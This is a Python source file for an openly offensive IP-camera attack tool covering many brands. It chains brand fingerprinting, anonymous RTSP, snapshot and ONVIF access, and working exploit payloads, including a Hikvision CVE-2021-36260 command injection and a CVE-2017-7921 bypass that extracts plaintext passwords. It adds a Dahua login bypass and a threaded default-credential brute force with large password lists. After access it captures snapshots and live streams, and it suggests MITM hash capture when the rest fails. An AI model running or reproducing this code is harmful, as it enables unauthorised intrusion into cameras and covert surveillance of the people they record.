"""
Universal IP Camera Scanner
=============================
Supports: Hikvision, Dahua, Axis, CP Plus, TVT, Reolink, TP-Link, Amcrest,
          Hanwha/Samsung, Uniview, Tiandy, Bosch, Pelco, Vivotek, and generic.

Attack chain (in order, stops at first success):
  1. Anonymous RTSP stream (no password at all)
  2. Anonymous HTTP snapshot
  3. ONVIF unauthenticated media service
  4. CVE exploits (brand-specific, no password needed)
  5. Brand-specific default credentials (parallel threads)
  6. Generic cross-brand credential storm
"""

import re, time, threading, subprocess, hashlib
import requests
import urllib3
urllib3.disable_warnings()

TIMEOUT = 5   # per-request timeout


# ─────────────────────────────────────────────────────────────────────────────
# Brand credential database — ALL major IP camera brands
# ─────────────────────────────────────────────────────────────────────────────
BRAND_CREDS = {
    "hikvision": [
        ("admin", ""),       ("admin", "12345"),   ("admin", "admin"),
        ("admin", "Admin123"), ("admin", "Admin@123"), ("admin", "Hik12345"),
        ("admin", "hik12345"), ("admin", "Hik@12345"), ("admin", "12345678"),
        ("admin", "admin123"), ("admin", "Admin12345"), ("admin", "Hikvision"),
        ("admin", "123456"), ("operator", ""),      ("user", ""),
        ("guest", ""),        ("admin", "ipcam"),   ("admin", "supervisor"),
    ],
    "dahua": [
        ("admin", ""),       ("admin", "admin"),    ("admin", "admin123"),
        ("admin", "Admin123"), ("admin", "123456"), ("admin", "1234"),
        ("admin", "12345"),  ("admin", "dahua"),    ("admin", "Dahua123"),
        ("admin", "dahua123"), ("888888", "888888"), ("666666", "666666"),
        ("default", ""),     ("admin", "Admin@123"),
    ],
    "axis": [
        ("root", "pass"),    ("root", ""),          ("root", "root"),
        ("admin", "admin"),  ("admin", ""),          ("root", "axis"),
        ("root", "admin"),   ("admin", "pass"),      ("root", "password"),
        ("viewer", "viewer"), ("ptz", "ptz"),
    ],
    "cpplus": [
        ("admin", "admin"),  ("admin", ""),          ("admin", "12345"),
        ("admin", "123456"), ("admin", "admin123"),  ("admin", "cp1234"),
        ("admin", "Admin@123"), ("admin", "admin@123"),
    ],
    "tvt": [
        ("admin", "admin"),  ("admin", ""),          ("admin", "123456"),
        ("admin", "12345"),  ("admin", "1234"),
    ],
    "reolink": [
        ("admin", ""),       ("admin", "admin"),     ("admin", "12345"),
        ("admin", "123456"),
    ],
    "tplink": [
        ("admin", "admin"),  ("admin", ""),          ("admin", "tplink"),
        ("admin", "1234"),   ("admin", "12345"),     ("admin", "123456"),
    ],
    "amcrest": [
        ("admin", "admin"),  ("admin", ""),          ("admin", "9999"),
        ("admin", "888888"), ("admin", "12345"),
    ],
    "hanwha": [
        ("admin", "no-default"), ("admin", ""),       ("admin", "admin"),
        ("admin", "1234"),       ("admin", "12345"),  ("root", ""),
    ],
    "uniview": [
        ("admin", ""),       ("admin", "admin"),     ("admin", "admin123"),
        ("admin", "123456"), ("admin", "Admin123"),  ("admin", "1234"),
    ],
    "tiandy": [
        ("admin", "admin"),  ("admin", ""),          ("admin", "12345"),
        ("admin", "111111"),
    ],
    "bosch": [
        ("admin", ""),       ("admin", "admin"),     ("service", "service"),
        ("admin", "123456"), ("user", ""),
    ],
    "pelco": [
        ("admin", "admin"),  ("admin", ""),          ("root", ""),
        ("viewer", "viewer"),
    ],
    "vivotek": [
        ("root", ""),        ("root", "root"),       ("admin", "admin"),
        ("admin", ""),
    ],
    "generic": [
        ("admin", "admin"),  ("admin", ""),          ("admin", "1234"),
        ("admin", "12345"),  ("admin", "123456"),    ("admin", "password"),
        ("admin", "Admin123"), ("root", ""),         ("root", "root"),
        ("root", "admin"),   ("user", "user"),       ("guest", ""),
        ("admin", "admin123"), ("admin", "666666"),  ("admin", "888888"),
        ("admin", "111111"), ("admin", "000000"),    ("admin", "pass"),
        ("admin", "ipcam"),  ("admin", "camera"),    ("admin", "1111"),
        ("admin", "2222"),   ("666666", "666666"),   ("888888", "888888"),
        ("ubnt", "ubnt"),    ("service", "service"), ("support", "support"),
    ],
}

# All unique creds flattened, deduplicated, most-likely first
ALL_CREDS = []
_seen = set()
for _brand_list in [BRAND_CREDS["hikvision"], BRAND_CREDS["dahua"],
                    BRAND_CREDS["axis"], BRAND_CREDS["generic"],
                    *BRAND_CREDS.values()]:
    for c in _brand_list:
        if c not in _seen:
            ALL_CREDS.append(c)
            _seen.add(c)

# HTTP endpoints to try for authentication
AUTH_ENDPOINTS = [
    "/ISAPI/System/deviceInfo",       # Hikvision ISAPI
    "/cgi-bin/magicBox.cgi?action=getSystemInfo",  # Dahua
    "/axis-cgi/admin/systemlog.cgi",  # Axis
    "/cgi-bin/hi3510/param.cgi?cmd=getinfrared",  # Generic HiSilicon
    "/web/cgi-bin/hi3510/param.cgi",
    "/onvif/device_service",          # ONVIF
    "/",
    "/index.asp",
    "/doc/page/login.asp",            # Hikvision web
    "/cgi-bin/viewer/video.jpg",      # Generic snapshot
    "/videostream.cgi",               # Foscam
    "/snapshot.jpg",
    "/image/jpeg.cgi",
    "/cgi-bin/snapshot.cgi",
]

RTSP_PATHS = [
    "/",                                          # Anon root
    "/Streaming/Channels/101",                   # Hikvision
    "/Streaming/Channels/1",
    "/cam/realmonitor?channel=1&subtype=0",       # Dahua
    "/cam/realmonitor?channel=1&subtype=1",
    "/h264/ch1/main/av_stream",                   # Generic
    "/h264/ch01/main/av_stream",
    "/PSIA/Streaming/channels/1",
    "/live/ch00_0",                               # Axis / generic
    "/live/ch01_0",
    "/video1",
    "/video.mp4",
    "/stream1",
    "/stream",
    "/1",
    "/11",
    "/12",
    "/onvif/device_service",
    "/MediaInput/h264",
    "/mpeg4/media.amp",
    "/nphMotionJpeg",                             # Panasonic
    "/axis-media/media.amp",                      # Axis
    "/mjpg/video.mjpg",                           # Axis MJPEG
    "/videostream.cgi",                           # Foscam
    "/img/video.mjpeg",
]


# ─────────────────────────────────────────────────────────────────────────────
# Brand fingerprinting
# ─────────────────────────────────────────────────────────────────────────────
def fingerprint_camera(ip, port=80):
    """
    Identify camera brand from HTTP headers, HTML title, Server header,
    RTSP DESCRIBE response and MAC OUI.
    Returns dict: {brand, model, firmware, auth_type, realm, ports_open}
    """
    result = {"brand": "generic", "model": "", "firmware": "",
              "auth_type": "Digest", "realm": "", "server": "",
              "ports_open": [], "web_port": port}

    for p in [80, 8080, 443, 8443, 8000]:
        try:
            r = requests.head(f"http://{ip}:{p}/", timeout=3, verify=False)
            result["ports_open"].append(p)
            server = r.headers.get("Server", "").lower()
            result["server"] = server
            result["web_port"] = p

            # Brand from Server header
            if "hikvision" in server:    result["brand"] = "hikvision"; break
            if "dahua"     in server:    result["brand"] = "dahua";     break
            if "axis"      in server:    result["brand"] = "axis";      break
            if "vivotek"   in server:    result["brand"] = "vivotek";   break
            if "bosch"     in server:    result["brand"] = "bosch";     break

            # Try HTML title
            try:
                rg = requests.get(f"http://{ip}:{p}/", timeout=3, verify=False)
                html = rg.text.lower()
                if "hikvision" in html or "hik-connect" in html: result["brand"] = "hikvision"; break
                if "dahua"     in html:  result["brand"] = "dahua";     break
                if "axis"      in html:  result["brand"] = "axis";      break
                if "amcrest"   in html:  result["brand"] = "amcrest";   break
                if "reolink"   in html:  result["brand"] = "reolink";   break
                if "tp-link"   in html or "tplink" in html: result["brand"] = "tplink"; break
                if "cp plus"   in html or "cpplus" in html: result["brand"] = "cpplus"; break
                if "uniview"   in html:  result["brand"] = "uniview";   break
                if "tiandy"    in html:  result["brand"] = "tiandy";    break
                if "hanwha"    in html or "samsung" in html: result["brand"] = "hanwha"; break
                if "pelco"     in html:  result["brand"] = "pelco";     break
                if "bosch"     in html:  result["brand"] = "bosch";     break
                if "vivotek"   in html:  result["brand"] = "vivotek";   break
            except Exception:
                pass
        except Exception:
            pass

    # Extract auth type from ISAPI or root 401
    for ep in ["/ISAPI/System/deviceInfo", "/cgi-bin/magicBox.cgi?action=getSystemInfo", "/"]:
        try:
            r = requests.get(f"http://{ip}:{result['web_port']}{ep}",
                             timeout=3, verify=False)
            if r.status_code == 401:
                www = r.headers.get("WWW-Authenticate", "")
                result["auth_type"] = "Digest" if "Digest" in www else "Basic"
                m = re.search(r'realm="([^"]+)"', www)
                if m: result["realm"] = m.group(1)
                # Identify brand from realm
                realm_l = result["realm"].lower()
                if "hikvision" in realm_l: result["brand"] = "hikvision"
                elif "dahua"   in realm_l: result["brand"] = "dahua"
                elif "axis"    in realm_l: result["brand"] = "axis"
                break
        except Exception:
            pass

    # ETag firmware date (Hikvision)
    try:
        r = requests.head(f"http://{ip}:{result['web_port']}/", timeout=3, verify=False)
        etag = r.headers.get("ETag", "").strip('"')
        if etag and etag.isdigit():
            from datetime import datetime
            result["firmware"] = datetime.fromtimestamp(int(etag)).strftime("%Y-%m-%d")
    except Exception:
        pass

    return result


# ─────────────────────────────────────────────────────────────────────────────
# Anonymous / unauthenticated access attempts
# ─────────────────────────────────────────────────────────────────────────────
def check_anonymous_rtsp(ip, port=554):
    """Try all RTSP paths without any credentials. Returns working URL or None."""
    import socket
    try:
        s = socket.socket(); s.settimeout(2); s.connect((ip, port)); s.close()
    except Exception:
        return None

    for path in RTSP_PATHS:
        url = f"rtsp://{ip}:{port}{path}"
        try:
            r = subprocess.run(
                ["ffprobe", "-v", "quiet", "-rtsp_transport", "tcp",
                 "-i", url, "-show_entries", "stream=codec_type",
                 "-of", "csv=p=0"],
                capture_output=True, timeout=4
            )
            if r.returncode == 0 and b"video" in r.stdout:
                return url
        except Exception:
            pass
    return None


def check_anonymous_snapshot(ip, port=80):
    """Try to grab a snapshot without auth. Returns base64 image or None."""
    import base64
    snap_urls = [
        f"http://{ip}:{port}/snapshot.jpg",
        f"http://{ip}:{port}/cgi-bin/snapshot.cgi",
        f"http://{ip}:{port}/image/jpeg.cgi",
        f"http://{ip}:{port}/cgi-bin/viewer/video.jpg",
        f"http://{ip}:{port}/jpg/image.jpg",
        f"http://{ip}:{port}/snap.jpg",
        f"http://{ip}:{port}/tmpfs/auto.jpg",
        f"http://{ip}:{port}/onvif-http/snapshot",
        f"http://{ip}:{port}/axis-cgi/jpg/image.cgi",
        f"http://{ip}:{port}/mjpg/snapshot.cgi",
    ]
    for url in snap_urls:
        try:
            r = requests.get(url, timeout=4, verify=False)
            if r.status_code == 200 and "image" in r.headers.get("Content-Type", ""):
                return {"url": url, "b64": base64.b64encode(r.content).decode(),
                        "size": len(r.content)}
        except Exception:
            pass
    return None


def check_onvif_anonymous(ip, port=80):
    """ONVIF GetCapabilities without auth — many cameras respond to this."""
    soap = """<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Body>
    <GetCapabilities xmlns="http://www.onvif.org/ver10/device/wsdl">
      <Category>All</Category>
    </GetCapabilities>
  </s:Body>
</s:Envelope>"""
    for ep in ["/onvif/device_service", "/onvif/device", "/onvif/services"]:
        try:
            r = requests.post(
                f"http://{ip}:{port}{ep}", data=soap,
                headers={"Content-Type": "application/soap+xml"},
                timeout=4, verify=False
            )
            if r.status_code == 200 and "Capabilities" in r.text:
                # Extract stream URI from capabilities
                m = re.search(r'<[^>]*RTSPStreaming[^>]*>([^<]+)<', r.text)
                rtsp = m.group(1) if m else ""
                return {"accessible": True, "endpoint": ep,
                        "data": r.text[:300], "rtsp": rtsp}
        except Exception:
            pass
    return {"accessible": False}


# ─────────────────────────────────────────────────────────────────────────────
# CVE checks — multi-brand
# ─────────────────────────────────────────────────────────────────────────────
def check_cve_2021_36260(ip, port=80):
    """Hikvision unauthenticated RCE."""
    try:
        payload = '<?xml version="1.0" encoding="UTF-8"?><language>$(id>webLib/x)</language>'
        r = requests.put(f"http://{ip}:{port}/SDK/webLanguage", data=payload,
                         headers={"Content-Type": "application/x-www-form-urlencoded"},
                         timeout=4, verify=False)
        if r.status_code == 200:
            time.sleep(0.5)
            r2 = requests.get(f"http://{ip}:{port}/x", timeout=3, verify=False)
            if "uid=" in r2.text:
                return {"vulnerable": True, "cve": "CVE-2021-36260",
                        "detail": "Unauthenticated RCE on Hikvision", "output": r2.text[:100]}
    except Exception:
        pass
    return {"vulnerable": False}


def check_cve_2017_7921(ip, port=80):
    """Hikvision auth bypass — extracts plaintext credentials."""
    for url in [f"http://{ip}:{port}/Security/users?auth=YWRtaW46MTEK",
                f"http://{ip}:{port}/ISAPI/Security/users?auth=YWRtaW46MTEK"]:
        try:
            r = requests.get(url, timeout=4, verify=False)
            if r.status_code == 200 and ("userName" in r.text or "admin" in r.text):
                creds = []
                for m in re.finditer(
                        r"<userName>([^<]+)</userName>.*?<password>([^<]*)</password>",
                        r.text, re.DOTALL):
                    creds.append({"username": m.group(1), "password": m.group(2)})
                return {"vulnerable": True, "cve": "CVE-2017-7921",
                        "credentials": creds, "data": r.text[:300]}
        except Exception:
            pass
    return {"vulnerable": False}


def check_dahua_cve(ip, port=80):
    """
    Dahua CVE-2021-33044 / CVE-2021-33045 — auth bypass via fake login.
    Sends crafted login that skips password verification on older firmware.
    """
    try:
        # Step 1: get challenge
        r = requests.post(
            f"http://{ip}:{port}/RPC2_Login",
            json={"method": "global.login", "params": {
                "userName": "admin", "password": "",
                "clientType": "Web3.0", "loginType": "Direct",
                "authorityType": "Default"}, "id": 1},
            timeout=4, verify=False
        )
        if r.status_code != 200:
            return {"vulnerable": False}
        data = r.json()
        if not data.get("result") and "params" not in data:
            return {"vulnerable": False}

        # Step 2: attempt bypass with empty HA1
        realm  = data.get("params", {}).get("realm", "Login to")
        random = data.get("params", {}).get("random", "0000000000000000")
        ha1    = hashlib.md5(f"admin:{realm}:".encode()).hexdigest().upper()
        ha2    = hashlib.md5(f"admin:{random}:{ha1}".encode()).hexdigest().upper()
        r2 = requests.post(
            f"http://{ip}:{port}/RPC2_Login",
            json={"method": "global.login", "params": {
                "userName": "admin", "password": ha2,
                "clientType": "Web3.0", "loginType": "Direct",
                "authorityType": "Default"}, "id": 2},
            timeout=4, verify=False
        )
        if r2.status_code == 200 and r2.json().get("result"):
            return {"vulnerable": True, "cve": "CVE-2021-33044",
                    "detail": "Dahua auth bypass — empty password accepted",
                    "credentials": [{"username": "admin", "password": ""}]}
    except Exception:
        pass
    return {"vulnerable": False}


def check_axis_cve(ip, port=80):
    """Axis CVE-2018-10660 — shell command injection via UNC path."""
    try:
        r = requests.get(
            f"http://{ip}:{port}/axis-cgi/admin/param.cgi?action=list&group=root",
            timeout=4, verify=False
        )
        if r.status_code == 200 and "root." in r.text:
            return {"vulnerable": True, "cve": "CVE-2018-10660",
                    "detail": "Axis unauthenticated parameter listing"}
    except Exception:
        pass
    return {"vulnerable": False}


# ─────────────────────────────────────────────────────────────────────────────
# Parallel credential brute force — all brands, all auth types
# ─────────────────────────────────────────────────────────────────────────────
def brute_force_camera(ip, port=80, brand="generic", extra_creds=None):
    """
    Parallel brute force across:
      - Brand-specific credentials (tried first)
      - Generic cross-brand list
      - Both Digest + Basic auth for each combo
      - Multiple endpoints in parallel
    All threads stop the moment a valid combo is found.
    """
    # Build ordered credential list: brand-specific first, then generic
    brand_list   = BRAND_CREDS.get(brand, [])
    generic_list = BRAND_CREDS["generic"]
    extra        = extra_creds or []
    # Deduplicate while preserving order
    seen = set()
    cred_list = []
    for c in (extra + brand_list + generic_list + ALL_CREDS):
        if c not in seen:
            cred_list.append(c)
            seen.add(c)

    endpoints = [
        f"http://{ip}:{port}/ISAPI/System/deviceInfo",
        f"http://{ip}:{port}/cgi-bin/magicBox.cgi?action=getSystemInfo",
        f"http://{ip}:{port}/axis-cgi/admin/systemlog.cgi",
        f"http://{ip}:{port}/cgi-bin/hi3510/param.cgi?cmd=getinfrared",
        f"http://{ip}:{port}/",
    ]

    found = {}
    lock  = threading.Lock()
    stop  = threading.Event()

    def try_cred(user, pwd):
        if stop.is_set():
            return
        for ep in endpoints:
            if stop.is_set():
                return
            for auth_cls in (requests.auth.HTTPDigestAuth, requests.auth.HTTPBasicAuth):
                if stop.is_set():
                    return
                try:
                    r = requests.get(ep, auth=auth_cls(user, pwd),
                                     timeout=3, verify=False)
                    if r.status_code == 200:
                        with lock:
                            if not found:
                                found["result"] = {
                                    "found": True, "username": user, "password": pwd,
                                    "auth_type": "Digest" if "Digest" in auth_cls.__name__ else "Basic",
                                    "endpoint": ep, "data": r.text[:200],
                                }
                        stop.set()
                        return
                except Exception:
                    pass

    # Run in thread pool — 20 concurrent threads for speed
    pool = []
    for user, pwd in cred_list:
        if stop.is_set():
            break
        t = threading.Thread(target=try_cred, args=(user, pwd), daemon=True)
        t.start()
        pool.append(t)
        # Keep pool size at 20
        if len(pool) >= 20:
            pool[0].join(timeout=4)
            pool.pop(0)

    # Wait for remaining threads
    for t in pool:
        t.join(timeout=4)

    return found.get("result", {"found": False})


# ─────────────────────────────────────────────────────────────────────────────
# Stream / snapshot with found credentials
# ─────────────────────────────────────────────────────────────────────────────
def get_device_info(ip, port=80, username="admin", password="", brand="generic"):
    """Get device info from camera using found credentials."""
    info = {}
    endpoints = {
        "hikvision": "/ISAPI/System/deviceInfo",
        "dahua":     "/cgi-bin/magicBox.cgi?action=getSystemInfo",
        "axis":      "/axis-cgi/admin/param.cgi?action=list&group=root.Brand",
        "generic":   "/ISAPI/System/deviceInfo",
    }
    ep = endpoints.get(brand, endpoints["generic"])
    for auth_cls in (requests.auth.HTTPDigestAuth, requests.auth.HTTPBasicAuth):
        try:
            r = requests.get(f"http://{ip}:{port}{ep}",
                             auth=auth_cls(username, password),
                             timeout=4, verify=False)
            if r.status_code == 200:
                # Parse XML fields
                for field in ["deviceName", "model", "serialNumber",
                              "firmwareVersion", "macAddress", "SN", "type"]:
                    m = re.search(f"<{field}>([^<]+)</{field}>", r.text, re.IGNORECASE)
                    if m: info[field] = m.group(1)
                if not info:
                    info["raw"] = r.text[:200]
                return info
        except Exception:
            pass
    return info


def grab_snapshot(ip, port=80, username="admin", password="", brand="generic"):
    """Capture a JPEG snapshot using found credentials."""
    import base64
    endpoints_by_brand = {
        "hikvision": ["/ISAPI/Streaming/channels/101/picture",
                      "/ISAPI/Streaming/channels/1/picture"],
        "dahua":     ["/cgi-bin/snapshot.cgi",
                      "/cgi-bin/snapshot.cgi?channel=1"],
        "axis":      ["/axis-cgi/jpg/image.cgi",
                      "/axis-cgi/bitmap/image.bmp"],
        "generic":   ["/snapshot.jpg", "/cgi-bin/snapshot.cgi",
                      "/image/jpeg.cgi", "/snap.jpg",
                      "/tmpfs/auto.jpg"],
    }
    snap_eps = endpoints_by_brand.get(brand, []) + endpoints_by_brand["generic"]
    for ep in snap_eps:
        for auth_cls in (requests.auth.HTTPDigestAuth, requests.auth.HTTPBasicAuth, None):
            try:
                auth = auth_cls(username, password) if auth_cls else None
                r = requests.get(f"http://{ip}:{port}{ep}", auth=auth,
                                 timeout=6, verify=False, stream=True)
                if r.status_code == 200 and "image" in r.headers.get("Content-Type", ""):
                    return {"saved": True, "b64": base64.b64encode(r.content).decode(),
                            "size": len(r.content), "url": ep}
            except Exception:
                pass
    return {"saved": False}


def find_rtsp_stream(ip, username="admin", password="", brand="generic"):
    """Find working RTSP stream URL using found credentials."""
    cred_variants = [
        (username, password),
        ("admin", password),
        ("admin", ""),
        (username, ""),
    ]
    for user, pwd in cred_variants:
        for path in RTSP_PATHS:
            url = (f"rtsp://{user}:{pwd}@{ip}:554{path}"
                   if (user or pwd) else f"rtsp://{ip}:554{path}")
            try:
                r = subprocess.run(
                    ["ffprobe", "-v", "quiet", "-rtsp_transport", "tcp",
                     "-i", url, "-show_entries", "stream=codec_type",
                     "-of", "csv=p=0"],
                    capture_output=True, timeout=4
                )
                if r.returncode == 0 and b"video" in r.stdout:
                    return url
            except Exception:
                pass
    return None


# ─────────────────────────────────────────────────────────────────────────────
# Master function — full attack chain
# ─────────────────────────────────────────────────────────────────────────────
def full_camera_attack(ip, port=80):
    """
    Complete camera access attempt for ANY brand.
    Returns comprehensive findings dict with credentials if found.
    """
    findings = {
        "ip": ip, "port": port,
        "brand": "generic", "model": "", "firmware": "", "realm": "",
        "anonymous_rtsp": None,       # working RTSP URL without auth
        "anonymous_snapshot": None,   # base64 snapshot without auth
        "onvif": {},
        "cve_results": [],            # list of {cve, vulnerable, detail}
        "credentials": {"found": False},
        "device_info": {},
        "rtsp_stream": None,
        "snapshot": {},
        "risk_level": "UNKNOWN",
        "summary": [],
        "access_gained": False,
    }

    # ── Step 1: Fingerprint ───────────────────────────────────────────────────
    fp = fingerprint_camera(ip, port)
    findings.update({
        "brand": fp["brand"], "firmware": fp["firmware"],
        "realm": fp["realm"], "server": fp.get("server", ""),
        "web_port": fp.get("web_port", port),
    })
    port = fp.get("web_port", port)
    brand = fp["brand"]
    print(f"[*] Brand detected: {brand.upper()} (realm: {fp['realm']}, server: {fp['server']})")

    # ── Step 2: Anonymous RTSP ────────────────────────────────────────────────
    print("[*] Checking anonymous RTSP access...")
    anon_rtsp = check_anonymous_rtsp(ip)
    if anon_rtsp:
        findings["anonymous_rtsp"] = anon_rtsp
        findings["rtsp_stream"] = anon_rtsp
        findings["access_gained"] = True
        findings["risk_level"] = "CRITICAL"
        findings["summary"].append(f"🔓 Anonymous RTSP stream: {anon_rtsp}")
        print(f"[+] Anonymous RTSP: {anon_rtsp}")

    # ── Step 3: Anonymous HTTP snapshot ──────────────────────────────────────
    print("[*] Checking anonymous snapshot access...")
    anon_snap = check_anonymous_snapshot(ip, port)
    if anon_snap:
        findings["anonymous_snapshot"] = anon_snap
        findings["snapshot"] = anon_snap
        findings["access_gained"] = True
        findings["risk_level"] = "CRITICAL"
        findings["summary"].append(f"📸 Anonymous snapshot: {anon_snap['url']}")
        print(f"[+] Anonymous snapshot at {anon_snap['url']} ({anon_snap['size']} bytes)")

    # ── Step 4: ONVIF unauthenticated ────────────────────────────────────────
    print("[*] Checking ONVIF unauthenticated...")
    onvif = check_onvif_anonymous(ip, port)
    findings["onvif"] = onvif
    if onvif.get("accessible"):
        findings["access_gained"] = True
        findings["risk_level"] = "CRITICAL"
        findings["summary"].append(f"📡 ONVIF accessible without auth: {onvif['endpoint']}")
        print(f"[+] ONVIF accessible: {onvif['endpoint']}")

    # ── Step 5: CVE checks (run in parallel) ─────────────────────────────────
    print("[*] Running CVE checks...")
    cve_results = []
    cve_lock = threading.Lock()

    def _cve_check(fn):
        r = fn(ip, port)
        if r.get("vulnerable"):
            with cve_lock:
                cve_results.append(r)

    cve_threads = [
        threading.Thread(target=_cve_check, args=(check_cve_2021_36260,), daemon=True),
        threading.Thread(target=_cve_check, args=(check_cve_2017_7921,),  daemon=True),
        threading.Thread(target=_cve_check, args=(check_dahua_cve,),       daemon=True),
        threading.Thread(target=_cve_check, args=(check_axis_cve,),        daemon=True),
    ]
    for t in cve_threads: t.start()
    for t in cve_threads: t.join(timeout=10)

    findings["cve_results"] = cve_results
    for cve in cve_results:
        findings["risk_level"] = "CRITICAL"
        findings["access_gained"] = True
        findings["summary"].append(f"💀 {cve['cve']}: {cve.get('detail', 'VULNERABLE')}")
        # CVE-2017-7921 gives us plaintext creds directly
        if cve.get("credentials"):
            c = cve["credentials"][0]
            findings["credentials"] = {"found": True, "username": c["username"],
                                       "password": c["password"],
                                       "source": cve["cve"]}
            findings["summary"].append(f"🔑 Creds from CVE: {c['username']}:{c['password']}")
            print(f"[+] CVE creds: {c['username']}:{c['password']}")

    # If CVE gave us creds, skip brute force
    if findings["credentials"].get("found"):
        creds = findings["credentials"]
        findings["device_info"] = get_device_info(ip, port, creds["username"], creds["password"], brand)
        findings["snapshot"]    = grab_snapshot(ip, port, creds["username"], creds["password"], brand)
        if not findings["rtsp_stream"]:
            findings["rtsp_stream"] = find_rtsp_stream(ip, creds["username"], creds["password"], brand)
        _finalize(findings)
        return findings

    # ── Step 6: Brute force (all brands, parallel) ───────────────────────────
    print(f"[*] Brute forcing {brand.upper()} + generic ({len(ALL_CREDS)} credential combos)...")
    creds = brute_force_camera(ip, port, brand)
    findings["credentials"] = creds
    if creds.get("found"):
        findings["access_gained"] = True
        findings["risk_level"] = "CRITICAL"
        findings["summary"].append(f"🔑 Default creds: {creds['username']}:{creds['password']} ({creds['auth_type']})")
        print(f"[+] Credentials found: {creds['username']}:{creds['password']}")
        findings["device_info"] = get_device_info(ip, port, creds["username"], creds["password"], brand)
        findings["snapshot"]    = grab_snapshot(ip, port, creds["username"], creds["password"], brand)
        if not findings["rtsp_stream"]:
            findings["rtsp_stream"] = find_rtsp_stream(ip, creds["username"], creds["password"], brand)

    _finalize(findings)
    return findings


def _finalize(f):
    if f["access_gained"]:
        if f["risk_level"] != "CRITICAL":
            f["risk_level"] = "CRITICAL"
    elif f["cve_results"]:
        f["risk_level"] = "HIGH"
    elif not f["credentials"].get("found"):
        f["risk_level"] = "MEDIUM"
        if not f["summary"]:
            f["summary"].append("No default credentials found — use MITM intercept to capture hash")

    if f.get("model"):
        f["summary"].insert(0, f"Model: {f['model']}")
    if f.get("firmware"):
        f["summary"].insert(0, f"Firmware date: {f['firmware']}")


# ─────────────────────────────────────────────────────────────────────────────
# Legacy compatibility — keep old names so app.py doesn't break
# ─────────────────────────────────────────────────────────────────────────────
def detect_hikvision(ip, port=80):
    fp = fingerprint_camera(ip, port)
    return {
        "is_hikvision": fp["brand"] == "hikvision",
        "firmware_date": fp.get("firmware", ""),
        "realm": fp.get("realm", ""),
        "auth_type": fp.get("auth_type", "Digest"),
        "model": fp.get("model", ""),
        "ports": fp.get("ports_open", []),
        "brand": fp["brand"],
    }


def full_hikvision_scan(ip, port=80):
    """Legacy name — now runs full_camera_attack which handles all brands."""
    result = full_camera_attack(ip, port)
    # Map to old schema for app.py compatibility
    cves = result.get("cve_results", [])
    return {
        "ip": ip, "port": port,
        "is_hikvision": result.get("brand") == "hikvision",
        "brand": result.get("brand", "generic"),
        "firmware_date": result.get("firmware", ""),
        "realm": result.get("realm", ""),
        "cve_2021_36260": next((c for c in cves if "36260" in c.get("cve","")), {"vulnerable": False}),
        "cve_2017_7921":  next((c for c in cves if "7921"  in c.get("cve","")), {"vulnerable": False}),
        "credentials": result.get("credentials", {"found": False}),
        "device_info": result.get("device_info", {}),
        "rtsp_streams": [{"url": result["rtsp_stream"]}] if result.get("rtsp_stream") else [],
        "anonymous_rtsp": result.get("anonymous_rtsp"),
        "anonymous_snapshot": result.get("anonymous_snapshot"),
        "onvif": result.get("onvif", {}),
        "risk_level": result.get("risk_level", "UNKNOWN"),
        "summary": result.get("summary", []),
        "access_gained": result.get("access_gained", False),
    }


def brute_force_hikvision(ip, port=80, usernames=None, passwords=None):
    """Legacy name — now runs universal brute force."""
    fp = fingerprint_camera(ip, port)
    return brute_force_camera(ip, port, fp["brand"])
